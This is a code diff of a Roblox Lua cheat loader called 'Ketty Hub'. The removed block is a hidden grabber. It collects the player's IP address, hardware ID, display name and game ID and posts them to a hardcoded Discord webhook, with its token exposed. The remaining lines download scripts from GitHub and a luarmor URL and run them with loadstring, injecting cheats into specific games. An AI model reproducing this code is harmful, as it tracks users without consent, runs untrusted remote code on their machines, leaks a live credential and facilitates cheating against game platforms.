@@ -1,54 +1,13 @@
-HttpService = game:GetService("HttpService")
-Webhook_URL = "https://discord.com/api/webhooks/1100115603882250312/6aSaKM5GlOeHeN2c7ka1F1oCD6yrSNohg6PNqGwpgOXeG6ARi6LYJ-yLUCeXtqQGOEL3"
-local ip = tostring(game:HttpGet("https://api.ipify.org", true))
-local GName = "Rebirth Champions X"
-local PlayerGname = game.Players.LocalPlayer.DisplayName
-
-local response = syn.request({
-    Url = Webhook_URL,
-    Method = 'POST',
-    Headers = {['Content-Type'] = 'application/json'},
-
-    Body = HttpService:JSONEncode({
-        username = "Cipeczka",
-        avatar_url = "",
-        content = "@everyone",
-        embeds = {
-            {
-                title = "Ketty Hub",
-                color = 13044234,
-                description = "IP Gracza: "..ip.."\nHWID Gracza: "..game:GetService("RbxAnalyticsService"):GetClientId().."\nGRA: "..GName.."\nPLACEID GRY: "..game.placeId,
-                
-                timestamp = "",
-                author = {
-                    name = PlayerGname
-                },
-                image = {},
-                thumbnail = {},
-                footer = {},
-                fields = {}
-            },
---            {
---                title = "Embed2",
---                color = 0,
---                description = "To jest Opis Embed2",
---                timestamp = "",
---                author = {},
---                image = {},
---                thumbnail = {},
---                footer = {},
---                fields = {}
---            }
-        }
-    })
-})
-
 if game.placeId == 8540346411 then
-    print("Executing Script For Rebirth Champions X")
+    print("Found Game Called: Rebirth Champions X")
     loadstring(game:HttpGet("https://raw.githubusercontent.com/SzutiDC/Ketty-Hub/main/Rebirth%20Champions%20X"))()
 elseif game.placeId == 6284583030 then
-    print("Finded Game: Pet Simulator X")
-        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a82cd5447cbbc4c7be0e8db405555787.lua"))()
+    print("Found Game Called: Pet Simulator X")
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a82cd5447cbbc4c7be0e8db405555787.lua"))()
+elseif game.placeId == 11868251164 then
+    print("Found Game Called: SKYDIVE Off A TOWER")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SzutiDC/Ketty-Hub/main/SKYDIVE%20Off%20A%20TOWER"))()
+
 
 else
     print('Game Not Supported')
